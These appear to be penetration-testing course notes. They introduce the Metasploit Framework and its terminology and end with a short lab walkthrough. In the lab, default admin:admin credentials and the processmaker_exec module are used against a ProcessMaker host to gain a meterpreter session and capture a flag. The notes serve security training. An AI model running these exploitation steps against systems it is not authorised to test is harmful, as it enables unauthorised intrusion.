# 6 - Exploitation Frameworks

## <mark style="color:red;">The Metasploit Framework (MSF)</mark>

* The Metasploit Framework (MSF) is an open-source, robust penetration testing and exploitation framework that is used by penetration testers and security researchers worldwide.
* It provides penetration testers with a robust infrastructure required to automate every stage of the penetration testing life cycle.
* It is also used to develop and test exploits and has one of the world's largest database of public, tested exploits.
* The Metasploit Framework is designed to be modular, allowing for new functionality to be implemented with ease.

### **Essential Terminology**

* **Interface** - Methods of interacting with the Metasploit Framework.
* &#x20;**Module** - Pieces of code that perform a particular task, an example of a module is an exploit.
* **Vulnerability** - Weakness or flaw in a computer system or network that can be exploited.
* **Exploit** - Piece of code/module that is used to take advantage of a vulnerability within a system, service or application.
* **Payload** - Piece of code delivered to the target system by an exploit with the objective of executing arbitrary commands or providing remote access to an attacker.
* **Listener** - A utility that listens for an incoming connection from a target.

### **Metasploit Framework Console**

* The Metasploit Framework Console (MSFconsole) is an easy-to-use all in one interface that provides you with access to all of the functionality of the Metasploit Framework.

### **Penetration Testing With MSF**

* The MSF can be used to perform and automate various tasks that fall under the penetration testing life cycle.
* In order to understand how we can leverage the MSF for penetration testing, we need to explore the various phases of a penetration test and their respective techniques and objectives.
* We can adopt the PTES (Penetration Testing Execution Standard) as a roadmap to understanding the various phases that make up a penetration test and how Metasploit can be integrated in to each phase.

### Practical Demonstration

{% code overflow="wrap" %}
```bash
# nmap scan, we exploited the http server (process maker)
# we did a google search for the default credentials admin:admin

# click the [Admin] tab, Users tab or Settings tab, System information(get the version)-2.5.0

# we do a search with "searchsploit"
searchsploit ProcessMaker

# create a workspace, search ProcessMaker 
use exploit/multi/http/processmaker_exec
options
set PASSWORD admin
set USERNAME admin
set RHOSTS $ip
run/exploit # we get a meterpreter session.
# get the flag in the C:\ root dir. 
```
{% endcode %}
